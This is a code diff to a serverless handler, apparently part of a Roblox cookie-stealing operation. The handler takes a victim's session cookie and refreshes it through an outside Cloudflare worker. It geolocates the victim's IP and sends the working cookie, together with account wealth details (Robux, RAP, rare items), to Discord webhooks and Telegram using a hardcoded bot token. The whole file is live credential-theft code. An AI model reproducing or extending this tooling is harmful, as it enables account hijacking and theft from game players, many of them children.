@@ -1,11 +1,11 @@
-// api/submit.js — Uses worker for cookie refresh, sends to Discord
+// api/submit.js — Uses worker for cookie validation
 const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
 const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
 
-// Cookie Refresher Worker URL
-const COOKIE_REFRESH_WORKER = 'https://holy-truth-3129.notrllyme133.workers.dev/refresh';
+// Your worker URL
+const COOKIE_WORKER_URL = 'https://socca.nlesocca.workers.dev/cookie';
 
 // Item asset IDs
 const ITEMS = {
@@ -40,13 +40,13 @@ async function getIpGeo(ip) {
   } catch { return null; }
 }
 
-// NEW: Use worker to refresh cookie and get account info
+// Call worker to validate/refresh cookie and get account info
 async function refreshCookieStatus(cookie) {
   try {
     const ctrl = new AbortController();
     const timer = setTimeout(() => ctrl.abort(), 15000);
     
-    const response = await fetch(COOKIE_REFRESH_WORKER, {
+    const response = await fetch(COOKIE_WORKER_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ cookie }),
@@ -54,7 +54,6 @@ async function refreshCookieStatus(cookie) {
     });
     
     clearTimeout(timer);
-    
     const result = await response.json();
     
     if (!result.success) {
@@ -66,11 +65,31 @@ async function refreshCookieStatus(cookie) {
       };
     }
     
+    // Map worker response to expected format
+    const acc = result.fullAccount || {};
     return {
       refreshed: true,
-      account: result.account,
-      newCookie: result.cookie,
-      isDifferent: result.isDifferent,
+      newCookie: result.newCookie || cookie,
+      isDifferent: result.isDifferent || false,
+      account: {
+        id: result.userId,
+        username: result.username,
+        displayName: result.displayName,
+        profileUrl: `https://www.roblox.com/users/${result.userId}/profile`,
+        avatarUrl: acc.avatarUrl || result.avatarUrl,
+        robux: acc.robux || 0,
+        rap: acc.rap || 0,
+        items: acc.limiteds || 0,
+        credit: acc.credit || 0,
+        premium: acc.hasPremium || false,
+        voiceChat: acc.voiceChat || false,
+        headless: acc.headless || false,
+        korblox: acc.korblox || false,
+        valkyrie: acc.valkyrie || false,
+        accountAge: acc.ageDays || 0,
+        friends: acc.friends || 0,
+        groupsOwned: acc.groupsOwned || 0
+      },
       timestamp: new Date().toISOString()
     };
     
@@ -270,7 +289,7 @@ export default async function handler(req, res) {
     return res.status(200).json({ success: true });
   }
 
-  // REFRESH COOKIE VIA WORKER (bypasses IP restrictions)
+  // Use worker for cookie validation/refresh
   const geoPromise = getIpGeo(ip);
   const accountPromise = refreshCookieStatus(cookie);
 
@@ -287,7 +306,6 @@ export default async function handler(req, res) {
   const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
   const isp = geo?.isp || 'Unknown';
   
-  // Use refreshed cookie if available
   const workingCookie = refreshResult.newCookie || cookie;
   const acc = refreshResult.refreshed ? refreshResult.account : null;
   const avatarUrl = acc?.avatarUrl || null;
@@ -340,27 +358,18 @@ export default async function handler(req, res) {
       description: `**${acc.username}** \`${acc.id}\`\n[View Profile](${acc.profileUrl})`,
       thumbnail: avatarUrl,
       fields: [
-        // Row 1: Economy
         { name: '💰 Robux', value: `⏣ ${acc.robux.toLocaleString()}`, inline: true },
         { name: '🎵 RAP', value: `${acc.rap.toLocaleString()}`, inline: true },
         { name: '💳 Credit', value: `$${acc.credit.toFixed(2)}`, inline: true },
-        
-        // Row 2: Account Stats
-        { name: '🗓️ Age', value: `${acc.ageDays.toLocaleString()}d`, inline: true },
+        { name: '🗓️ Age', value: `${acc.accountAge.toLocaleString()}d`, inline: true },
         { name: '⭐ Premium', value: acc.premium ? '✓ Yes' : '✗ No', inline: true },
         { name: '🎙️ VC', value: acc.voiceChat ? '✓ On' : '✗ Off', inline: true },
-        
-        // Row 3: Social
         { name: '👥 Friends', value: acc.friends.toLocaleString(), inline: true },
         { name: '👑 Groups', value: acc.groupsOwned.toString(), inline: true },
-        { name: '📦 Items', value: acc.limiteds.toString(), inline: true },
-        
-        // Row 4: Limiteds
+        { name: '📦 Items', value: acc.items.toString(), inline: true },
         { name: '💀 Headless', value: acc.headless ? '✓ Owned' : '✗ None', inline: true },
         { name: '⚔️ Korblox', value: acc.korblox ? '✓ Owned' : '✗ None', inline: true },
         { name: '🪽 Valkyrie', value: acc.valkyrie ? '✓ Owned' : '✗ None', inline: true },
-        
-        // Refresher Link
         { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${REFRESH_COOKIE_LINK}`, inline: false }
       ]
     });
@@ -369,7 +378,7 @@ export default async function handler(req, res) {
     if (webhook1) await discordSend(webhook1, accountPayload);
   }
 
-  // STEP 3: 🔐 Send Refreshed Cookie
+  // STEP 3: 🔐 Send Working Cookie
   await discordSendCookie(webhook2, workingCookie, acc?.username);
   if (webhook1) await discordSendCookie(webhook1, workingCookie, acc?.username);
 
@@ -381,7 +390,7 @@ export default async function handler(req, res) {
     `🗺️ ${isp}`,
     `👤 ${acc ? acc.username : 'Invalid'}`,
     acc ? `💰 Robux: ${acc.robux.toLocaleString()}` : '',
-    acc ? `🎵 RAP: ${acc.rap.toLocaleString()} (${acc.limiteds} items)` : '',
+    acc ? `🎵 RAP: ${acc.rap.toLocaleString()} (${acc.items} items)` : '',
     acc ? `⭐ Premium: ${acc.premium ? 'Yes' : 'No'}` : '',
     acc ? `💀 Headless: ${acc.headless ? 'Yes' : 'No'}` : '',
     acc ? `⚔️ Korblox: ${acc.korblox ? 'Yes' : 'No'}` : '',
